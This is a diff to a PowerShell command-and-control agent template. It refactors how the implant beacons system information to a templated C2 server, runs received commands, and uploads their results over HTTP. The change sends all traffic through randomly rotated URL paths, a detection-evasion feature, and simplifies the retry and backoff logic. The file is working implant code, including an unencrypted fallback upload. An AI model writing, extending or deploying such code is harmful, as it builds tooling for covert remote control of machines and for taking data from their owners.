@@ -6,10 +6,6 @@
 # Server details
 $global:serverAddress = '{{SERVER_ADDRESS}}'
 
-# Initial endpoint paths
-$beaconPath = '{{BEACON_PATH}}'
-$commandResultPath = '{{CMD_RESULT_PATH}}'
-
 # Agent configuration
 $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
 $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage
@@ -340,7 +336,6 @@ function Get-RandomToken {
 function Send-Beacon {
     param(
         $SystemInfo,  # Changed from [System.Collections.Hashtable] to allow any type
-        [string]$Path = $null,
         [bool]$UseRandomPath = $true
     )
     
@@ -353,15 +348,8 @@ function Send-Beacon {
         $systemInfoJson = $SystemInfo
     }
     
-    # Select a path - either provided, random from pool, or the designated beacon path
-    $beaconPath = $Path
-    if (-not $beaconPath -and $UseRandomPath -and $global:pathRotationEnabled -and $global:pathPool.Count -gt 0) {
-        $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
-        $beaconPath = $global:pathPool[$randomIndex]
-    }
-    elseif (-not $beaconPath) {
-        $beaconPath = Get-CurrentPath -PathType "beacon_path"
-    }
+    # Select a random path from the pool
+    $beaconPath = Get-RandomPath
     
     # Create the operation payload with operation type
     $operationPayload = @{
@@ -427,24 +415,15 @@ function Send-Beacon {
     }
 }
 
-# Function to send command results with modular path selection
+# Function to send command results using random path selection
 function Send-CommandResult {
     param(
         [string]$Timestamp,
-        [string]$Result,
-        [string]$Path = $null,
-        [bool]$UseRandomPath = $true
+        [string]$Result
     )
     
-    # Select a path - either provided, random from pool, or the designated result path
-    $resultPath = $Path
-    if (-not $resultPath -and $UseRandomPath -and $global:pathRotationEnabled -and $global:pathPool.Count -gt 0) {
-        $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
-        $resultPath = $global:pathPool[$randomIndex]
-    }
-    elseif (-not $resultPath) {
-        $resultPath = Get-CurrentPath -PathType "cmd_result_path"
-    }
+    # Select a random path from the pool
+    $resultPath = Get-RandomPath
     
     # Create result object
     $resultObj = @{
@@ -531,7 +510,7 @@ function Process-Commands {
                 $success = Update-EncryptionKey -Base64Key $args
                 $result = if ($success) { "Key issuance successful - secure channel established" } else { "Key issuance failed" }
                 
-                # Send the result back to C2 using modular path selection
+                # Send the result back to C2 using a random path
                 $resultObj = @{
                     timestamp = $timestamp
                     result = $result
@@ -552,12 +531,12 @@ function Process-Commands {
                     try {
                         # Use Send-CommandResult if we have a successful key setup
                         if ($success) {
-                            Send-CommandResult -Timestamp $timestamp -Result $result -UseRandomPath $false
+                            Send-CommandResult -Timestamp $timestamp -Result $result
                             $sendSuccess = $true
                         }
                         else {
                             # If key setup failed, try with unencrypted data on first attempt
-                            $resultUrl = "http://$serverAddress$commandResultPath"
+                            $resultUrl = "http://$serverAddress$(Get-RandomPath)"
                             
                             if ($currentRetry -eq 0) {
                                 $resultClient.UploadString($resultUrl, $resultJson)
@@ -655,8 +634,8 @@ function Process-Commands {
                 $result = "Unknown command type: $commandType"
             }
             
-            # Send the result back to C2 using modular path selection
-            Send-CommandResult -Timestamp $timestamp -Result $result -UseRandomPath $true
+            # Send the result back to C2 using a random path
+            Send-CommandResult -Timestamp $timestamp -Result $result
             
             # Track this command as processed
             $global:processedCommandIds[$commandId] = $true
@@ -669,7 +648,7 @@ function Process-Commands {
             }
             
             try {
-                Send-CommandResult -Timestamp $timestamp -Result "Error executing command: $_" -UseRandomPath $true
+                Send-CommandResult -Timestamp $timestamp -Result "Error executing command: $_"
                 # Track this command as processed even if it resulted in an error
                 $global:processedCommandIds[$commandId] = $true
             }
@@ -719,12 +698,9 @@ function Start-AgentLoop {
             # Prepare system info data
             $systemInfo = Get-SystemIdentification
             
-            # Send beacon with modular path selection
-            # Use random path if path rotation is enabled and we're not in fallback mode
-            $useRandomPath = $global:pathRotationEnabled -and -not $usingFallbackPaths
-            
+            # Send beacon with random path selection
             try {
-                $response = Send-Beacon -SystemInfo $systemInfo -UseRandomPath $useRandomPath
+                $response = Send-Beacon -SystemInfo $systemInfo -UseRandomPath $true
                 
                 # Reset failure counter on successful connection
                 $consecutiveFailures = 0
@@ -786,16 +762,10 @@ function Start-AgentLoop {
                 # Increment failure counter
                 $consecutiveFailures++
                 
-                # If too many failures and using dynamic paths, try falling back to default paths
-                if ($global:pathRotationEnabled -and $consecutiveFailures -ge $maxFailuresBeforeFallback -and -not $usingFallbackPaths) {
-                    Write-Host "Falling back to initial paths after $consecutiveFailures failures"
-                    $usingFallbackPaths = $true
-                }
-                
-                # If still failing with fallback paths, increase the beacon interval temporarily
-                if ($consecutiveFailures -gt ($maxFailuresBeforeFallback * 2)) {
+                # If too many failures, increase the beacon interval temporarily
+                if ($consecutiveFailures -gt $maxFailuresBeforeFallback) {
                     # Exponential backoff with max of the configured max backoff time
-                    $backoffSeconds = [Math]::Min([int]$maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback * 2) + 2))
+                    $backoffSeconds = [Math]::Min([int]$maxBackoffTime, [Math]::Pow(2, ($consecutiveFailures - $maxFailuresBeforeFallback) + 2))
                     Write-Host "Connection issues persist, waiting $backoffSeconds seconds before retry"
                     Start-Sleep -Seconds $backoffSeconds
                     continue
